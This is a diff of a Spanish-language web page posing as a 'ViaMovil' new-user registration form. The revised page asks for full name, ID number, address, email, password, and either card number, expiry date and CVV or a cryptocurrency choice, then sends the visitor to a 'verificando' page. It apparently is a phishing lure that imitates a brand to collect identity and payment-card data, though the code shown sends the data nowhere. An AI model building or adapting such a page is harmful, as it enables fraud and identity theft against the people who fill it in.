@@ -2,65 +2,85 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Formulario VíaMovil</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      padding: 20px;
-      margin: 0;
-    }
-    .container {
-      max-width: 500px;
-      margin: auto;
-      background: #fff;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    img {
-      width: 80px;
-    }
-    h2 {
-      color: #d90000;
-    }
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-    button {
-      background-color: #d90000;
-      color: white;
-      border: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro Usuarios Nuevos</title>
+    <script>
+        function mostrarMetodo() {
+            var metodo = document.getElementById("metodoPago").value;
+            document.getElementById("tarjeta").style.display = metodo === "tarjeta" ? "block" : "none";
+            document.getElementById("crypto").style.display = metodo === "crypto" ? "block" : "none";
+            document.getElementById("enviar").disabled = false;
+        }
+
+        function enviarFormulario() {
+            window.location.href = "verificando.html";
+        }
+    </script>
+    <style>
+body {
+    background-image: url('fondo.png');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    color: white;
+}
+h2 {
+    color: gold;
+}
+
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        header img {
+            height: 40px;
+        }
+        form {
+            max-width: 500px;
+            margin: auto;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <img src="viamovil_logo.png" alt="Logo VíaMovil" />
-    <h2>Registro de Usuario</h2>
-    <form onsubmit="mostrarCargando(event)">
-      <input type="text" placeholder="Nombre completo" required />
-      <input type="text" placeholder="Ciudad de residencia" required />
-      <input type="text" placeholder="Identificación" required />
-      <input type="text" placeholder="Dirección de residencia" required />
-      <input type="email" placeholder="Correo electrónico" required />
-      <input type="password" placeholder="Contraseña" required />
-      <input type="password" placeholder="Confirmar contraseña" required />
-      <input type="file" required />
-      <button type="submit">Enviar datos</button>
+    <header>
+        <img src="logo.png" alt="ViaMovil Logo">
+    </header>
+    <form onsubmit="event.preventDefault(); enviarFormulario();">
+        <h2>Registro Usuarios Nuevos</h2>
+        <input type="text" placeholder="Nombre Completo" required>
+        <input type="text" placeholder="Identificación" required>
+        <input type="text" placeholder="Dirección de Residencia" required>
+        <input type="text" placeholder="Ciudad de Residencia" required>
+        <input type="email" placeholder="Correo Electrónico" required>
+        <input type="password" placeholder="Contraseña" required>
+        <input type="password" placeholder="Verificar Contraseña" required>
+        <label for="metodoPago">Método de Pago:</label>
+        <select id="metodoPago" onchange="mostrarMetodo()" required>
+            <option value="">Seleccione</option>
+            <option value="tarjeta">Tarjeta de Crédito/Débito</option>
+            <option value="crypto">Criptomonedas</option>
+        </select>
+        <div id="tarjeta" style="display:none;">
+            <input type="text" placeholder="Número de Tarjeta">
+            <input type="text" placeholder="Fecha de Vencimiento">
+            <input type="text" placeholder="CVV">
+        </div>
+        <div id="crypto" style="display:none;">
+            <select>
+                <option>Bitcoin</option>
+                <option>Ethereum</option>
+                <option>USDT</option>
+                <option>BNB</option>
+            </select>
+        </div>
+        <button id="enviar" type="submit" disabled>Enviar Datos</button>
     </form>
-  </div>
-  <script>
-    function mostrarCargando(e) {
-      e.preventDefault();
-      window.location.href = "cargando.html";
-    }
-  </script>
 </body>
 </html>
